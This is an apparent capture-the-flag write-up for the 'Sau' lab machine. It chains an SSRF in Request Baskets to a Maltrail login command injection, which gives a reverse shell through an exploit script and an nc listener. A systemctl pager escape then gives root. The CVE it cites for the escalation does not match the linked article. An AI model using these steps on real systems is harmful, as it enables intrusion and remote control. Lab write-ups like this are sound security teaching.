# Sau

<table>
  <tr>
    <td>
      <img width="150" height="150" alt="SauIcon" src="https://github.com/user-attachments/assets/ffbc035e-6ca0-4a35-a7a9-dcbc44b04f7b" />
    </td>
    <td style="vertical-align: center; padding-left: 5rem;">
      <strong>Machine Difficulty:</strong> Easy <br />
      <strong>Creator:</strong> sau123 <br />
      <u><strong>Unofficial Writeup by HeadMonitor</strong></u>
    </td>
  </tr>
</table>

## Enumeration

We scan the machine with Nmap and find 3 open ports, one **SSH**, one **http** and one **uknown**.

```bash
nmap -sC -sV ${MACHINE_IP}

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-31 15:54 UTC
Nmap scan report for ${MACHINE_IP}
Host is up (0.057s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 31 Jul 2025 15:55:14 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 31 Jul 2025 15:54:47 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 31 Jul 2025 15:54:48 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=7/31%Time=688B91C8%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Thu,\x2031\x20Jul\
SF:x202025\x2015:54:47\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\
SF:"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x
SF:20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Thu,\x2031\x20Jul\
SF:x202025\x2015:54:48\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nDate:\x20Thu,\x2031\x20Jul\x202025\x2015:55:14\x20GM
SF:T\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20
SF:name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}
SF:\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.11 seconds
```
<br/>

If we put the the Machine's IP on the browser we don't get any results. So lets try specifying the unknown port as well. Bingo!

<img width="1906" height="715" alt="image" src="https://github.com/user-attachments/assets/0dbb5c71-5f8a-4b39-8993-9a1ac1301cd3" />

## Website

We see a service called **Request Baskets** on **Version 1.2.1**. **Request Baskets** is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI. 

A quick search will show us [**CVE-2023-27163**](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) for this exact version. We can use SSRF to get access to internal services. Earlier we saw an **http** service on port 80 which we couldn't access. So lets try to get to that.

We will first create a **New Basket**. Then we will go to **Configuration Settings** to configure our basket as follows:

<img width="600" height="384" alt="image" src="https://github.com/user-attachments/assets/dc7b9097-448c-4367-92ce-5e672a5deae6" />
<br/>

Then we will follow our Baskets URL (`http://${MACHINE_IP}:55555/${BASKET_ID}`) and find another service, **Maltrail** on **Version 0.53**!

## Foothold

The Maltrail site doesn't load the CSS properly, probably due to the Basket Forward, but we do not mind. After a quick search we find that **Maltrail** is a **Malicious Traffic Detection System** and on this version we find [**CVE-2025-34073**](https://nvd.nist.gov/vuln/detail/CVE-2025-34073). This vulnerability will let us use RCE via the username parameter in a POST request. So let's try to get a **Reverse Shell**.

[Spookier](https://github.com/spookier) has made a [Python Script](https://github.com/spookier/Maltrail-v0.53-Exploit) to make our life easier and directly exploit the vulnurability. We simply need an **Ncat** listener and to run the script. 

The script sends a cURL request to the Target URL as well as appending `/login` to the URL as that's where you can login to Maltrail. The payload contains the `username=;` field where the `;` allows us to use commands after it that will be executed on the Server.

```bash
nc -lvnp [listening_PORT]
```

```bash
python3 exploit.py [listening_IP] [listening_PORT] [target_URL]
```
<br/>

We successfully created a **Reverse Shell**. To make our shell better we will execute the following command.

```bash
script /dev/null -c bash
```
<br/>

If we run `id` we can see that we are user `puma`.

```
puma@sau:/opt/maltrail$ id 

uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

If we go to our User's `home/` directory, we will find the **User Flag**!

```bash
puma@sau:~$ cat /home/puma/user.txt

[REDACTED_FLAG]
```

## Privilage Escalation

Lets see what vulnerability we can find to Escalate our Privilages. If we run `sudo -l` we can see if and where we can use `sudo`.

```bash
puma@sau:~$ sudo -l

Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
<br/>

Interesting! We see that we have permissions to execute `sudo systemctl status trail.service`. Let's also see what version `systemctl` is on.

```bash
systemctl --version

systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```
<br/>

A quick search reveals that **Systemd Version 245** has a vulnerability, [**CVE-2020-13529**](https://nvd.nist.gov/vuln/detail/cve-2020-13529). Another look at [this](https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7) article will reveal to us exactly how to exploit this vulnerability.

We run the `systemctl` command we have access to, and while on the pager just type `!sh`. Just like that we are now root! 

```bash
sudo systemctl status trail.service

WARNING: terminal is not fully functional
-  (press RETURN)
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Thu 2025-07-31 15:52:59 UTC; 1h 40min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 877 (python3)
      Tasks: 12 (limit: 4662)
     Memory: 24.7M
     CGroup: /system.slice/trail.service
             ├─ 877 /usr/bin/python3 server.py
             ├─1300 /bin/sh -c logger -p auth.info -t "maltrail[877]" "Failed p>
             ├─1301 /bin/sh -c logger -p auth.info -t "maltrail[877]" "Failed p>
             ├─1304 sh
             ├─1305 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1306 /bin/sh
             ├─1308 script /dev/null -c bash
             ├─1309 bash
             ├─1348 sudo systemctl status trail.service
             ├─1349 systemctl status trail.service
             └─1350 pager

Jul 31 15:52:59 sau systemd[1]: Started Maltrail. Server of malicious traffic d>
Jul 31 16:49:16 sau maltrail[1262]: Failed password for None from 127.0.0.1 por>
lines 1-23!sh
!sshh!sh
```
<br/>

To make our shell better again, we will execute the following command. 

```bash
script /dev/null -c bash
```
<br/>

If we go to `root/` directory, we will find the **Root Flag**!

```bash
puma@sau:~$ cat /root/root.txt

[REDACTED_FLAG]
```
